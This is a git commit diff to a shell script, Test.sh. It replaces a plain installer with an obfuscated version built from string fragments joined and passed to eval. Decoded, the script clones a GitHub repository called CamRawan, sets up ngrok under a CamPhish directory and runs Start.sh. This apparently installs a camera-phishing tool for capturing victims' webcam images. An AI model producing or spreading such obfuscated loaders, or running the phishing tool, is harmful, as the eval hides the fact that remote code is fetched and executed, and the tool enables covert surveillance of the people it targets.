97c149a45c3981f8129bb27f1d113bd8f9de84cd
BaapG <87407116+Vretlee@users.noreply.github.com>
2021-09-11 10:38:46 +0530

    Update Test.sh
    B

--- Test.sh
+++ Test.sh
@@ -1,14 +1,3 @@
-apt-get update -y
-apt-get upgrade -y
-pkg install python -y
-pkg install python2 -y
-pkg install git -y
-pip install lolcat
-bash Vretlee.sh
-git clone https://github.com/Vretlee/CamRawan
-ls
-unzip ngrok.zip
-cp ngrok $HOME/CamPhish/CamRawan
-cd CamRawan
-chmod +x ngrok
-bash Start.sh
+z="
+";hz='unzi';Nz='on2 ';kz='zip';lz='cp n';fz='n';ABz='ok';Mz='on -';yz=' ngr';nz=' $HO';tz='cd C';bz='.com';sz='awan';CBz='rt.s';Zz='//gi';Xz='e ht';Dz='te -';Vz='.sh';Hz='-y';qz='ish/';mz='grok';ez='Rawa';Pz='pip ';Lz='pyth';Oz='git ';Gz='ade ';Uz='tlee';Kz='all ';DBz='h';Bz='get ';Sz='bash';xz='d +x';cz='/Vre';jz='rok.';rz='CamR';Iz='pkg ';Qz='lolc';vz='wan';oz='ME/C';Az='apt-';pz='amPh';Ez='y';Jz='inst';az='thub';Fz='upgr';uz='amRa';Yz='tps:';BBz=' Sta';wz='chmo';Cz='upda';Wz='clon';dz='/Cam';gz='ls';iz='p ng';Rz='at';Tz=' Vre';
+eval "$Az$Bz$Cz$Dz$Ez$z$Az$Bz$Fz$Gz$Hz$z$Iz$Jz$Kz$Lz$Mz$Ez$z$Iz$Jz$Kz$Lz$Nz$Hz$z$Iz$Jz$Kz$Oz$Hz$z$Pz$Jz$Kz$Qz$Rz$z$Sz$Tz$Uz$Vz$z$Oz$Wz$Xz$Yz$Zz$az$bz$cz$Uz$dz$ez$fz$z$gz$z$hz$iz$jz$kz$z$lz$mz$nz$oz$pz$qz$rz$sz$z$tz$uz$vz$z$wz$xz$yz$ABz$z$Sz$BBz$CBz$DBz"
